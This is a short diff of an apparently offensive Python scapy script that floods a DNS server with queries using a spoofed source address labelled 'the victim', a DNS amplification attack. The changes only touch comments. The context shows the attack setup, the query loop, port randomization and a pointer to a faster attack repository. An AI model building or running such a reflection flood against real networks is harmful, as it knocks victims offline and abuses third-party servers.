@@ -4,7 +4,7 @@ import time
 from scapy.all import * 
 
 # to do look into https://github.com/ethanwilloner/DNS-Amplification-Attack for faster speed
-resolve_domain = "dnsrtgshop.com" # domain to resolve. Be aware some nameservers deny ANY requests
+resolve_domain = "dnsrtgshop.com" # domain to resolve
 src_ip = "10.10.10.3" # spoofed source or in other words the victim
 dns_server_ip = "10.10.10.5" # DNS server.
 query_type = "ALL" # DNS query type. A, MX, TXT, ALL
@@ -33,6 +33,6 @@ while True:
 
 	src_port += 1
 	if (src_port > 65530):
-		src_port = random.randint(49152,65530)
+		src_port = random.randint(49152,65530) # randomize source port
 	ip_id += 1
 	dns_id += 1
